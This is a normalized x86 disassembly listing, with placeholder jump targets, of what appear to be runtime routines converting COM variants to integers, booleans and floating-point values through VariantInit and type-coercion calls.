mov eax [ eax + 0x8 ]
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_40f630
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_40f54c
mov [ ebp - 0x8 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_40f588
mov [ ebp - 0x8 ] eax
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov dx 0x3
mov ax 0x1
call sub_40e440
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4031b0
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4031b0
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4031b0
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4031b0
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4031b0
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4031b0
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp - 0x4 ]
test ah 0x40
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_40f5ec
test al al
jne r-xdata
mov edx [ ebp - 0x4 ]
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax [ ebp - 0x4 ]
call sub_40f54c
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_40f54c
mov [ ebp - 0x8 ] eax
jmp r-xdata
jmp [ eax * 4 + jump_table_40f887 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_402aa0
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_402aa0
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fild [ eax ]
fdiv [ r-xdata ]
call sub_402aa0
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_402aa0
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_40f498
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
test eax eax
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x4 ]
mov eax [ eax ]
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_40f630
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4031b0
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4031b0
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4031b0
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4031b0
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4031b0
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4031b0
sub_40fa80
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
sub ax 0x1
jb r-xdata
xor ebx ebx
jmp r-xdata
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
sub ax 0xa
je r-xdata
xor ebx ebx
jmp r-xdata
mov dx 0x10
mov ax 0x1
call sub_40e440
mov ebx [ ebp - 0x4 ]
mov bl [ ebx + 0x8 ]
jmp r-xdata
sub ax 0x5
je r-xdata
mov ebx [ ebp - 0x4 ]
mov bl [ ebx + 0x8 ]
jmp r-xdata
jmp r-xdata
xor eax eax
push ebp
push sub_40fb0c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40f630
mov ebx eax
add ebx 0x80
cmp ebx 0xff
jbe r-xdata
add ebx 0xffffff80
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_4031b0
sub_40fb30
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
sub ax 0x1
jb r-xdata
xor ebx ebx
jmp r-xdata
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
sub ax 0xa
je r-xdata
xor ebx ebx
jmp r-xdata
mov dx 0x11
mov ax 0x1
call sub_40e440
mov ebx [ ebp - 0x4 ]
mov bl [ ebx + 0x8 ]
jmp r-xdata
sub ax 0x6
je r-xdata
mov ebx [ ebp - 0x4 ]
mov bl [ ebx + 0x8 ]
jmp r-xdata
jmp r-xdata
xor eax eax
push ebp
push sub_40fbb3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40f630
mov ebx eax
cmp ebx 0xff
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_4031b0
sub_40fbd8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x11
ja r-xdata
xor eax eax
push ebp
push sub_40fcac
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40f630
mov ebx eax
add ebx 0x8000
cmp ebx 0xffff
jbe r-xdata
mov al [ eax + lookup_table_40fbfe ]
jmp [ eax * 4 + jump_table_40fc10 ]
add ebx 0xffff8000
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_4031b0
xor ebx ebx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
mov bx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov bx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movsx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor ebx ebx
jmp r-xdata
mov dx 0x2
mov ax 0x1
call sub_40e440
sub_40fcd0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x12
ja r-xdata
xor eax eax
push ebp
push sub_40fd85
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40f630
mov ebx eax
cmp ebx 0xffff
jbe r-xdata
mov al [ eax + lookup_table_40fcf2 ]
jmp [ eax * 4 + jump_table_40fd05 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_4031b0
xor ebx ebx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
mov bx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov bx [ ebx + 0x8 ]
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor ebx ebx
jmp r-xdata
mov dx 0x12
mov ax 0x1
call sub_40e440
sub_40fda8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x13
ja r-xdata
xor eax eax
push ebp
push sub_40fe6d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4100f4
test edx edx
je r-xdata
mov al [ eax + lookup_table_40fdce ]
jmp [ eax * 4 + jump_table_40fde2 ]
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_4031b0
xor ebx ebx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
movsx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx + 0x8 ]
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor ebx ebx
jmp r-xdata
mov dx 0x13
mov ax 0x1
call sub_40e440
sub_40fe90
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x3
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
push 0x5
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
mov eax [ esp + 0x10 ]
cdq
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp r-xdata
cmp eax 0x80020005
jne r-xdata
fld [ esp + 0x10 ]
call sub_402aa0
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax [ esp ]
mov edx [ esp + 0x4 ]
add esp 0x18
pop ebx
retn
mov dx [ ebx ]
mov cx 0x14
call sub_40e8d4
mov [ esp ] 0x0
mov [ esp + 0x4 ] 0x0
mov eax ebx
call sub_4106f0
and eax 0x7f
xor edx edx
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp r-xdata
sub_40ff3c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41002a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0xc ]
call sub_4126b8
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_404270
mov eax [ ebp - 0x1c ]
lea edx [ ebp - 0x8 ]
call sub_40825c
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410031
lea eax [ ebp - 0x1c ]
call sub_403fe8
lea eax [ ebp - 0xc ]
call sub_4046c8
retn
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
jmp r-xdata
cmp eax 0x80020005
jne r-xdata
fld [ ebp - 0x18 ]
call sub_402aa0
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
jmp r-xdata
mov dx [ ebx ]
mov cx 0x14
call sub_40e8d4
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x0
mov eax ebx
call sub_4106f0
and eax 0x7f
xor edx edx
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
jmp r-xdata
sub_41003c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_410093
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_40efa0
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_4100f4
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41009a
lea eax [ ebp - 0x18 ]
call sub_40ec78
retn
sub_4100a8
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_41418c
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x14
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_4100f4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_410500
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_410127 ]
mov eax [ ebp - 0x4 ]
call sub_40ff3c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
dec dx
je r-xdata
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0xc ] 0x0
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_402aa0
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_402aa0
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fdiv [ r-xdata ]
call sub_402aa0
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_402aa0
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_40ff3c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x8 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0xc ]
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_4100f4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_40fe90
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41003c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov dx 0x14
mov ax 0x1
call sub_40e440
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
test ah 0x40
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_4100a8
test al al
jne r-xdata
mov edx [ ebp - 0x4 ]
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax [ ebp - 0x4 ]
call sub_40fe90
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x4 ]
call sub_40fe90
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
jmp [ eax * 4 + jump_table_41034b ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_402aa0
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_402aa0
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fild [ eax ]
fdiv [ r-xdata ]
call sub_402aa0
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_402aa0
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_40ff3c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x4 ]
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_4100f4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
sub_410538
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4105ef
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x8 ]
call sub_4126b8
lea eax [ ebp - 0xa ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_404270
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x1 ]
call sub_408348
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4105f6
lea eax [ ebp - 0x10 ]
call sub_403fe8
lea eax [ ebp - 0x8 ]
call sub_4046c8
retn
mov dx [ ebx ]
mov cx 0xb
mov eax 0x80020005
call sub_40e8d4
jmp r-xdata
mov dx [ ebx ]
mov cx 0xb
call sub_40e8d4
cmp [ ebp - 0xa ] 0x1
sbb eax eax
inc eax
mov [ ebp - 0x1 ] al
jmp r-xdata
sub_410600
push ebx
add esp 0xfffffff0
mov ebx eax
push esp
call VariantInit
push 0xb
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0xb
call sub_40e8d4
cmp [ esp + 0x8 ] 0x1
sbb eax eax
inc eax
add esp 0x10
pop ebx
retn
sub_410640
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx eax
lea eax [ ebp - 0x11 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_410694
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x11 ]
call sub_40efa0
lea eax [ ebp - 0x11 ]
call [ rw-data ]
lea eax [ ebp - 0x11 ]
call sub_4106f0
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41069b
lea eax [ ebp - 0x11 ]
call sub_40ec78
retn
sub_4106a4
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_41418c
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0xb
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
cmp [ esp + 0xc ] 0x1
sbb eax eax
inc eax
mov [ edi ] al
sub_4106f0
push ebx
push ecx
mov ebx eax
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_41070a ]
mov eax ebx
call sub_410538
mov [ esp ] al
jmp r-xdata
dec dx
je r-xdata
mov [ esp ] 0x0
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
fld [ ebx + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
fld [ ebx + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
fild [ ebx + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
fld [ ebx + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax ebx
call sub_410538
mov [ esp ] al
jmp r-xdata
cmp [ ebx + 0x8 ] 0x1
sbb eax eax
inc eax
mov [ esp ] al
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
call sub_4106f0
mov [ esp ] al
jmp r-xdata
mov eax ebx
call sub_410600
mov [ esp ] al
jmp r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov eax ebx
call sub_410640
mov [ esp ] al
jmp r-xdata
jmp r-xdata
mov [ esp ] 0x0
jmp r-xdata
mov dx 0xb
mov ax 0x1
call sub_40e440
setne al
mov [ esp ] al
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_4106a4
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_410600
mov [ esp ] al
mov eax ebx
call sub_410600
mov [ esp ] al
jmp r-xdata
jmp [ eax * 4 + jump_table_4108cc ]
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax ebx
call sub_410538
mov [ esp ] al
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x1
sbb eax eax
inc eax
mov [ esp ] al
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
call sub_4106f0
mov [ esp ] al
jmp r-xdata
setne al
mov [ esp ] al
jmp r-xdata
cmp [ eax ] 0x0
sub_410a44
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_410af9
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0xc ]
call sub_4126b8
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_404270
mov eax [ ebp - 0x1c ]
lea edx [ ebp - 0x18 ]
call sub_409534
test al al
je r-xdata
sub edx 0x7ffdfffb
jne r-xdata
mov dx [ ebx ]
mov cx 0x5
mov eax 0x80020005
call sub_40e8d4
jmp r-xdata
fld [ ebp - 0x18 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov dx [ ebx ]
mov cx 0x5
call sub_40e8d4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410b00
lea eax [ ebp - 0x1c ]
call sub_403fe8
lea eax [ ebp - 0xc ]
call sub_4046c8
retn
sub_410b08
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x5
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x5
call sub_40e8d4
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
fld [ esp ]
add esp 0x18
pop ebx
retn
sub_410b54
